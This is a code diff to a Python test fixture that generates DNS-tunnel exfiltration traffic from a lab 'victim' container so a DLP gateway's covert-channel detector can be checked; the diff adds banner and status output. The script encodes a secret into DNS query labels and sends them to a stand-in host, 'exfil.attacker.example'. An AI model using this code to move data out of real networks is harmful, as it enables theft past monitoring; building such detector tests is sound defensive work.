@@ -1,8 +1,10 @@
 """DNS covert-channel test generator (Workstream C fixture).
 
 Runs on the *victim* container to produce the DNS traffic patterns that the DLP
-gateway's covert-channel detector must catch. Standard library only, because the
-victim image ships with `requests` but no scapy.
+gateway's covert-channel detector must catch. Queries are built with the
+standard library (no scapy needed, since they are plain UDP DNS packets);
+terminal output reuses the shared `ui.display` presentation layer, the same one
+the ICMP demo uses, so DNS and ICMP demos look consistent.
 
 The secret is encoded, chunked into DNS labels, and sent as A/TXT queries for
 `<chunk-index>.<encoded-chunk>.<base-domain>` straight at the attacker's DNS
@@ -32,9 +34,32 @@ import struct
 import sys
 import time
 
+from ui.display import (
+    print_hint,
+    print_status,
+    print_success,
+    render_attack_banner,
+    render_payload_telemetry,
+)
+
 DEFAULT_SERVER = os.environ.get("DNS_SINK_IP", "172.21.0.10")
 DEFAULT_DOMAIN = "exfil.attacker.example"
 MAX_LABEL = 63  # RFC 1035 label limit
+
+# Per-mode banner copy: the objective shown to demo observers and the detector
+# rule(s) each encoding is expected to trip (see dns_detector.py's taxonomy).
+MODE_OBJECTIVE = {
+    "naive": "Plaintext secret in DNS labels (human-readable QNAME)",
+    "hex": "Base16-encoded secret smuggled in DNS query labels",
+    "base32": "Base32-encoded secret smuggled in DNS query labels",
+    "base64": "URL-safe base64 secret smuggled in DNS query labels",
+}
+MODE_EXPECTED = {
+    "naive": "DNS_SENSITIVE_DATA_* / DNS_LONG_QNAME when the QNAME is sensitive or long",
+    "hex": "DNS_HIGH_ENTROPY (encoded labels)",
+    "base32": "DNS_HIGH_ENTROPY (encoded labels)",
+    "base64": "DNS_HIGH_ENTROPY (encoded labels)",
+}
 
 
 def encode(secret: bytes, mode: str) -> str:
@@ -99,15 +124,34 @@ def main() -> int:
     qtype = 16 if args.qtype == "TXT" else 1
     encoded = encode(args.secret.encode("utf-8"), args.mode)
     labels = chunk(encoded, args.chunk_size)
+    total_queries = len(labels) * args.count
+
+    expected = MODE_EXPECTED[args.mode]
+    # Many distinct subdomains under one apex also trip the volume rule.
+    if total_queries >= 8:
+        expected += " + DNS_TUNNEL_VOLUME (high query volume)"
+
+    render_attack_banner(
+        target=f"{args.server}:53",
+        scenario_mode=f"DNS Tunnel Exfiltration ({args.mode})",
+        scenario_description=MODE_OBJECTIVE[args.mode],
+        expected_alert_identifier=expected,
+        channel_label="DNS Covert Channel",
+    )
+
+    render_payload_telemetry(
+        args.secret.encode("utf-8"),
+        panel_title="Secret to Exfiltrate",
+    )
+
+    print_status(
+        f"Encoded with [bold]{args.mode}[/] -> {len(labels)} label(s), "
+        f"sending {total_queries} [bold]{args.qtype}[/] query(ies) to "
+        f"[yellow]{args.server}[/] ([dim]{args.domain}[/])"
+    )
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.settimeout(2.0)
-
-    print(
-        f"[dns-exfil] mode={args.mode} qtype={args.qtype} "
-        f"chunks={len(labels)} -> {args.server} ({args.domain})",
-        flush=True,
-    )
 
     sent = 0
     for _ in range(args.count):
@@ -117,11 +161,13 @@ def main() -> int:
                 qname = qname[:253]
             send_query(sock, args.server, qname, qtype)
             sent += 1
+            print_status(f"[dim]q{sent:02d}[/] {args.qtype} -> {qname}")
             if args.delay:
                 time.sleep(args.delay * random.uniform(0.75, 1.25))
     sock.close()
 
-    print(f"[dns-exfil] done, {sent} queries sent", flush=True)
+    print_success(f"{sent} quer{'y' if sent == 1 else 'ies'} sent to [yellow]{args.server}[/].")
+    print_hint("Check covert-detector logs for the DNS tunnel alert.")
     return 0
 
 
